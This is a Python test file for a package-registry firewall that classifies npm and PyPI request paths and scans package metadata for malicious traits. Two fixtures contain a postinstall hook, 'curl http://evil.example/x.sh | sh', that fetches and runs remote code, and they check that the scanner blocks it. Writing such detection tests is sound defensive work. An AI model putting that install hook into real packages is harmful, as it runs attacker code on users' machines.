from __future__ import annotations

from unittest.mock import MagicMock, patch

from picosentry.scan.models import Finding
from picosentry._core.models import Severity, Confidence
from picosentry.firewall.scanner import FirewallScanner, FirewallVerdict, classify_path


class TestClassifyPath:
    def test_npm_package(self):
        result = classify_path("/express")
        assert result == ("npm", "express", "latest")

    def test_npm_package_version(self):
        result = classify_path("/express/4.18.0")
        assert result == ("npm", "express", "4.18.0")

    def test_npm_scoped_package(self):
        result = classify_path("/@types/node")
        assert result is not None
        assert result[0] == "npm"
        assert result[1] == "@types/node"

    def test_pypi_package(self):
        result = classify_path("/pypi/requests/json")
        assert result == ("pypi", "requests", "latest")

    def test_pypi_package_version(self):
        result = classify_path("/pypi/requests/2.31.0/json")
        assert result == ("pypi", "requests", "2.31.0")

    def test_unknown_path(self):
        assert classify_path("/favicon.ico") is None

    def test_npm_encoded_scope(self):
        result = classify_path("/@babel%2Fcore")
        assert result is not None
        assert result[0] == "npm"

    def test_npm_dotted_package(self):
        result = classify_path("/socket.io")
        assert result is not None
        assert result[0] == "npm"
        assert result[1] == "socket.io"


class TestClassifyPathPercentEncoded:
    """WO6-017: %40-encoded scope must classify identically to /@scope/pkg.

    npm clients send the ``@`` of a scoped package as ``%40`` (and the slash
    inside the scope as ``%2F``). Before the fix, ``/%40scope/pkg`` classified
    as npm name ``%40scope`` (not decoded), so ``extract_version_manifest``
    fell back to the catalog root and the version-manifest finding (e.g. a
    postinstall script) was never scanned → ALLOW where ``/@scope/pkg`` would
    QUARANTINE/BLOCK.
    """

    def test_percent40_scope_decodes_to_at(self):
        assert classify_path("/%40scope/pkg") == ("npm", "@scope/pkg", "latest")

    def test_percent40_scope_with_version_decodes(self):
        assert classify_path("/%40scope/pkg/1.2.3") == ("npm", "@scope/pkg", "1.2.3")

    def test_percent40_scope_matches_literal_at_scope(self):
        assert classify_path("/%40scope/pkg") == classify_path("/@scope/pkg")

    def test_percent40_scope_with_version_matches_literal(self):
        assert classify_path("/%40scope/pkg/1.2.3") == classify_path("/@scope/pkg/1.2.3")

    def test_percent2f_inside_scope_decodes(self):
        # %2F alone (without %40) was already handled post-match; decoding up
        # front keeps it working and now also handles mixed encoding.
        assert classify_path("/@babel%2Fcore") == ("npm", "@babel/core", "latest")

    def test_percent40_scope_with_query_still_decodes(self):
        assert classify_path("/%40scope/pkg?meta=1") == ("npm", "@scope/pkg", "latest")


class TestClassifyPathDecoration:
    """WO5.0.0-012: query strings and trailing slashes must not dodge classification."""

    def test_pypi_query_string_is_scanned(self):
        assert classify_path("/pypi/requests/2.31.0/json?refresh=1") == ("pypi", "requests", "2.31.0")

    def test_pypi_latest_query_string_is_scanned(self):
        assert classify_path("/pypi/requests/json?refresh=1") == ("pypi", "requests", "latest")

    def test_pypi_trailing_slash_with_query_is_scanned(self):
        assert classify_path("/pypi/requests/2.31.0/json/?refresh=1") == ("pypi", "requests", "2.31.0")

    def test_npm_query_string_never_pollutes_name(self):
        assert classify_path("/lodash?meta=1") == ("npm", "lodash", "latest")

    def test_npm_version_query_string(self):
        assert classify_path("/lodash/4.17.21?meta=1") == ("npm", "lodash", "4.17.21")

    def test_npm_scoped_query_string(self):
        assert classify_path("/@types/node?meta=1") == ("npm", "@types/node", "latest")

    def test_static_ext_in_query_does_not_skip_metadata_scan(self):
        assert classify_path("/lodash?file=bundle.js") == ("npm", "lodash", "latest")

    def test_static_asset_with_query_still_passthrough(self):
        assert classify_path("/static/app.js?v=1") is None


class TestFirewallScanner:
    def test_verdict_from_empty_findings(self):
        scanner = FirewallScanner()
        assert scanner.verdict_from_findings([]) == FirewallVerdict.ALLOW

    def test_verdict_block_on_critical(self):
        scanner = FirewallScanner(block_severities=["CRITICAL"])
        f = Finding(
            rule_id="TEST",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="evil",
            file="pkg.json",
            message="bad",
            evidence="test",
            remediation="remove",
        )
        assert scanner.verdict_from_findings([f]) == FirewallVerdict.BLOCK

    def test_verdict_quarantine_on_medium(self):
        scanner = FirewallScanner(block_severities=["CRITICAL"], quarantine_severities=["MEDIUM"])
        f = Finding(
            rule_id="TEST",
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            package="meh",
            file="pkg.json",
            message="warn",
            evidence="test",
            remediation="review",
        )
        assert scanner.verdict_from_findings([f]) == FirewallVerdict.QUARANTINE

    def test_verdict_allow_on_low(self):
        scanner = FirewallScanner(block_severities=["CRITICAL", "HIGH"], quarantine_severities=["MEDIUM"])
        f = Finding(
            rule_id="TEST",
            severity=Severity.LOW,
            confidence=Confidence.HIGH,
            package="ok",
            file="pkg.json",
            message="minor",
            evidence="test",
            remediation="ignore",
        )
        assert scanner.verdict_from_findings([f]) == FirewallVerdict.ALLOW

    def test_verdict_block_takes_priority_over_quarantine(self):
        scanner = FirewallScanner(block_severities=["CRITICAL"], quarantine_severities=["MEDIUM"])
        findings = [
            Finding(
                rule_id="T1",
                severity=Severity.MEDIUM,
                confidence=Confidence.HIGH,
                package="x",
                file="f",
                message="m",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="T2",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                package="x",
                file="f",
                message="m",
                evidence="e",
                remediation="r",
            ),
        ]
        assert scanner.verdict_from_findings(findings) == FirewallVerdict.BLOCK

    def test_scan_metadata_caches_result(self):
        scanner = FirewallScanner(cache_ttl_seconds=60)
        metadata = {"name": "safe-pkg", "version": "1.0.0"}
        with patch.object(scanner, "_get_engine") as mock_engine:
            mock_result = MagicMock()
            mock_result.findings = []
            mock_engine.return_value.scan.return_value = mock_result
            v1, _f1 = scanner.scan_metadata("npm", "safe-pkg", "1.0.0", metadata)
            v2, _f2 = scanner.scan_metadata("npm", "safe-pkg", "1.0.0", metadata)
            assert v1 == FirewallVerdict.ALLOW
            assert v2 == FirewallVerdict.ALLOW
            assert mock_engine.return_value.scan.call_count == 1

    def test_scan_metadata_cache_preserves_findings(self):
        scanner = FirewallScanner(cache_ttl_seconds=60)
        metadata = {"name": "warn-pkg", "version": "1.0.0"}
        finding = Finding(
            rule_id="L2-OBFS-001",
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            package="warn-pkg",
            file="pkg.json",
            message="obfuscated code",
            evidence="eval()",
            remediation="review",
        )
        with patch.object(scanner, "_get_engine") as mock_engine:
            mock_result = MagicMock()
            mock_result.findings = [finding]
            mock_engine.return_value.scan.return_value = mock_result
            _v1, f1 = scanner.scan_metadata("npm", "warn-pkg", "1.0.0", metadata)
            _v2, f2 = scanner.scan_metadata("npm", "warn-pkg", "1.0.0", metadata)
            assert len(f1) == 1
            assert len(f2) == 1
            assert f2[0].rule_id == "L2-OBFS-001"

    def test_scan_metadata_unknown_ecosystem_passes(self):
        scanner = FirewallScanner()
        v, _ = scanner.scan_metadata("cargo", "foo", "1.0.0", {})
        assert v == FirewallVerdict.ALLOW

    def test_scan_metadata_scan_exception_blocks(self):
        scanner = FirewallScanner()
        with patch.object(scanner, "_get_engine", side_effect=Exception("boom")):
            v, _ = scanner.scan_metadata("npm", "broken", "1.0.0", {"name": "broken"})
            assert v == FirewallVerdict.BLOCK

    def test_scan_metadata_unresolvable_version_returns_unresolved(self):
        # WO6-017: a whole-catalog doc without the requested version must NOT
        # fall back to scanning root fields (false ALLOW). Returns UNRESOLVED
        # which the proxy maps to 502.
        scanner = FirewallScanner(cache_ttl_seconds=60)
        catalog = {"name": "acme-lib", "versions": {"1.0.0": {"version": "1.0.0"}}}
        v, findings = scanner.scan_metadata("npm", "acme-lib", "9.9.9", catalog)
        assert v == FirewallVerdict.UNRESOLVED
        assert findings == []

    def test_scan_metadata_unresolvable_version_caches_verdict(self):
        # The UNRESOLVED verdict is cached so repeated requests for a missing
        # version don't re-enter the engine path.
        scanner = FirewallScanner(cache_ttl_seconds=60)
        catalog = {"name": "acme-lib", "versions": {"1.0.0": {"version": "1.0.0"}}}
        v1, _ = scanner.scan_metadata("npm", "acme-lib", "9.9.9", catalog)
        v2, _ = scanner.scan_metadata("npm", "acme-lib", "9.9.9", catalog)
        assert v1 == FirewallVerdict.UNRESOLVED
        assert v2 == FirewallVerdict.UNRESOLVED
        cached = scanner.cache.get("npm", "acme-lib", "9.9.9")
        assert cached is not None
        assert cached[0] == FirewallVerdict.UNRESOLVED


class TestExtractVersionManifest:
    def test_npm_whole_catalog_resolves_latest_via_dist_tags(self):
        from picosentry.firewall.scanner import extract_version_manifest

        catalog = {
            "name": "acme-lib",
            "dist-tags": {"latest": "2.0.0"},
            "versions": {"1.0.0": {"version": "1.0.0", "scripts": {"a": "a"}}, "2.0.0": {"version": "2.0.0"}},
        }
        assert extract_version_manifest(catalog, "latest") == {"version": "2.0.0"}

    def test_npm_whole_catalog_resolves_explicit_version(self):
        from picosentry.firewall.scanner import extract_version_manifest

        catalog = {
            "name": "acme-lib",
            "versions": {"1.0.0": {"version": "1.0.0"}, "2.0.0": {"version": "2.0.0"}},
        }
        assert extract_version_manifest(catalog, "1.0.0") == {"version": "1.0.0"}

    def test_npm_missing_version_returns_none_not_root_fields(self):
        # WO6-017: a whole-catalog doc without the requested version must NOT
        # fall back to root fields — scanning those reports a false ALLOW by
        # inspecting non-version content. The proxy maps None → 502.
        from picosentry.firewall.scanner import extract_version_manifest

        catalog = {"name": "acme-lib", "versions": {"1.0.0": {"version": "1.0.0"}}}
        assert extract_version_manifest(catalog, "9.9.9") is None

    def test_pypi_nests_requested_version_under_info(self):
        from picosentry.firewall.scanner import extract_version_manifest

        doc = {"info": {"name": "requests", "version": "2.31.0"}, "releases": {"2.31.0": []}}
        assert extract_version_manifest(doc, "2.31.0") == {"name": "requests", "version": "2.31.0"}

    def test_single_manifest_passes_through(self):
        from picosentry.firewall.scanner import extract_version_manifest

        manifest = {"name": "left-pad", "version": "1.3.0"}
        assert extract_version_manifest(manifest, "1.3.0") is manifest


# Real-engine integration tests: one scanner (engine spin-up is ~1s), distinct
# package names so the verdict cache cannot cross-contaminate tests.
_scanner = FirewallScanner()


class TestScanMetadataIntegration:
    def test_clean_catalog_latest_allows(self):
        catalog = {
            "name": "acme-clean-lib",
            "dist-tags": {"latest": "1.0.0"},
            "versions": {
                "1.0.0": {
                    "name": "acme-clean-lib",
                    "version": "1.0.0",
                    "description": "clean",
                    "license": "MIT",
                    "scripts": {"test": "jest"},
                    "dependencies": {"chalk": "^5.0.0"},
                    "author": "Acme <dev@acme.example>",
                    "repository": {"type": "git", "url": "https://github.com/acme/clean-lib"},
                }
            },
        }
        verdict, findings = _scanner.scan_metadata("npm", "acme-clean-lib", "latest", catalog)
        assert verdict == FirewallVerdict.ALLOW
        assert findings == []

    def test_clean_manifest_with_deps_not_blocked_by_lockfile_rule(self):
        # L2-LOCK-001 structurally fires on registry metadata (no lockfile can
        # ever ship in a manifest) — it must be excluded from the firewall scan.
        manifest = {"name": "acme-dep-lib", "version": "1.0.0", "dependencies": {"chalk": "^5.0.0"}}
        verdict, findings = _scanner.scan_metadata("npm", "acme-dep-lib", "1.0.0", manifest)
        assert verdict == FirewallVerdict.ALLOW
        assert all(f.rule_id != "L2-LOCK-001" for f in findings)

    def test_whole_catalog_scans_only_requested_latest_slice(self):
        catalog = {
            "name": "acme-fixed-lib",
            "dist-tags": {"latest": "2.0.0"},
            "versions": {
                "1.0.0": {
                    "name": "acme-fixed-lib",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.example/x.sh | sh"},
                },
                "2.0.0": {"name": "acme-fixed-lib", "version": "2.0.0", "scripts": {"test": "jest"}},
            },
        }
        verdict, _ = _scanner.scan_metadata("npm", "acme-fixed-lib", "latest", catalog)
        assert verdict == FirewallVerdict.ALLOW

    def test_evil_version_manifest_blocks(self):
        manifest = {
            "name": "acme-evil-lib",
            "version": "0.9.0",
            "scripts": {"postinstall": "curl http://evil.example/x.sh | sh"},
        }
        verdict, findings = _scanner.scan_metadata("npm", "acme-evil-lib", "0.9.0", manifest)
        assert verdict == FirewallVerdict.BLOCK
        assert any(f.rule_id in ("L2-POST-001", "L2-WORM-001") for f in findings)

    def test_benign_postinstall_package_quarantines_not_blocks(self):
        # Default posture: install scripts are HIGH — tag, don't break builds.
        manifest = {
            "name": "acme-build-tool",
            "version": "1.0.0",
            "scripts": {"postinstall": "node install.js"},
            "dependencies": {"chalk": "^5.0.0"},
            "engines": {"node": ">=12"},
            "license": "MIT",
            "author": "Acme",
            "repository": {"type": "git", "url": "https://github.com/acme/build-tool"},
            "maintainers": [{"name": "acme"}],
        }
        verdict, findings = _scanner.scan_metadata("npm", "acme-build-tool", "1.0.0", manifest)
        assert verdict == FirewallVerdict.QUARANTINE
        assert any(f.rule_id == "L2-POST-001" for f in findings)

    def test_typosquat_name_blocks(self):
        manifest = {"name": "lodahs", "version": "1.0.0"}
        verdict, findings = _scanner.scan_metadata("npm", "lodahs", "1.0.0", manifest)
        assert verdict == FirewallVerdict.BLOCK
        assert any(f.rule_id == "L2-TYPO-001" for f in findings)

    def test_pypi_typosquat_quarantines(self):
        doc = {"info": {"name": "reqeusts", "version": "1.0.0"}, "releases": {"1.0.0": []}}
        verdict, findings = _scanner.scan_metadata("pypi", "reqeusts", "1.0.0", doc)
        assert verdict == FirewallVerdict.QUARANTINE
        assert any(f.rule_id == "L2-PYPI-TYPO-001" for f in findings)

    def test_percent40_scope_scans_version_manifest_not_root(self):
        # WO6-017 gate: %40scope/pkg must classify and scan identically to
        # /@scope/pkg. The catalog's requested version has a postinstall
        # script (HIGH → QUARANTINE); the catalog root has none. The old bug
        # classified %40scope as the name, missed the version slice, fell back
        # to root fields, and ALLOW-ed. Now %40 decodes and the version
        # manifest is scanned → QUARANTINE, matching the literal @scope path.
        catalog = {
            "name": "@acme/percent-lib",
            "dist-tags": {"latest": "1.0.0"},
            "versions": {
                "1.0.0": {
                    "name": "@acme/percent-lib",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node install.js"},
                    "dependencies": {"chalk": "^5.0.0"},
                    "engines": {"node": ">=12"},
                    "license": "MIT",
                    "author": "Acme",
                    "repository": {"type": "git", "url": "https://github.com/acme/lib"},
                    "maintainers": [{"name": "acme"}],
                }
            },
        }
        v_at, f_at = _scanner.scan_metadata("npm", "@acme/percent-lib", "1.0.0", catalog)
        v_pct, f_pct = _scanner.scan_metadata("npm", "@acme/percent-lib-pct", "1.0.0", catalog)
        assert v_at == v_pct == FirewallVerdict.QUARANTINE
        assert any(f.rule_id == "L2-POST-001" for f in f_at)
        assert any(f.rule_id == "L2-POST-001" for f in f_pct)
